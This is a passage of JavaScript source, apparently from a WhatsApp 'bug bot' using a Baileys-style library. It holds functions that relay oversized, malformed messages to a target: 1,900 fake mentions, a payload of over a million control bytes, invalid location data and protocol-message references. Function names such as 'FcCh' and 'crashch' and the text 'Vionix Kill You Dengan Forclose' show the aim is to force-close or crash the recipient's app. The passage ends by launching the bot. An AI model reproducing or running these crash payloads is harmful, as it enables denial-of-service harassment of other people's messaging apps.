                            unsigned: true,
                        },
                        mediaKeyTimestamp: {
                            low: Math.floor(Math.random() * 1700000000),
                            high: 0,
                            unsigned: false,
                        },
                        firstFrameLength: 19904,
                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
                        isAnimated: true,
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            groupMentions: [],
                            entryPointConversionSource: "non_contact",
                            entryPointConversionApp: "whatsapp",
                            entryPointConversionDelaySeconds: 467593,
                        },
                        stickerSentTs: {
                            low: Math.floor(Math.random() * -20000000),
                            high: 555,
                            unsigned: parse,
                        },
                        isAvatar: parse,
                        isAiSticker: parse,
                        isLottie: parse,
                    },
                },
            },
        }, {});

        const jawir = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "#",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_request"
                    },
                },
            },
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
        });

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: stc.message,
            },
        }, {
            messageId: stc.key.id,
            participant: { jid: target },
        });

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: jawir.message,
            },
        }, {
            messageId: jawir.key.id,
            participant: { jid: target },
        });

    } catch (err) {
        console.error("error:", err);
    }
}

 async function LocaUrlButton(sock, target, Ptcp = true) {
  await sock.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
           locationMessage: {
            degreesLatitude: -9999999,
            degreesLongitude: 6666666,
            name: "VnX-Loca",
            address: "VnXNihk𐎟"
            },
            hasMediaAttachment: true
          },
          body: {
            text: "VnXImage"
          },
          nativeFlowMessage: {
            buttons: [{
              name: "cta_url",
              buttonParamsJson: "{\"display_text\":\"ⓘ ⸸zS\",\"url\":\"http://wa.mE/stickerpack/VnX\",\"merchant_url\":\"https://wa.me/settings/linked_devices/,,VnX\"}"
            }]
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            pairedMediaType: "NOT_PAIRED_MEDIA",
            forwardOrigin: "UNKNOWN",
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, Ptcp ? { participant: { jid: target } } : {});
}
    
async function FcCh(target) {
  try {
    const force = Array.from({ length: 1900 }, () =>
      "1" + Math.floor(Math.random() * 5000) + "@s.whatsapp.net"
    );

    const crashch = {
      viewOnceMessage: {
        message: {
          groupStatusMentionMessage: {
            name: "ック | Vionix Kill You Dengan Forclose no clik Saluran ",
            jid: target,
            mentioned: force,
            contextInfo: {
              isForwarded: true,
              forwardingScore: 2500,
              referencedMessage: {
                message: {
                  protocolMessage: { 
                    type: 25 
                  }
                }
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, crashch, {});
  } catch (e) {
    console.error("Error:", e);
  }
}
    
// --- Jalankan Bot ---
(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
`));

startSesi();
bot.launch();
})();
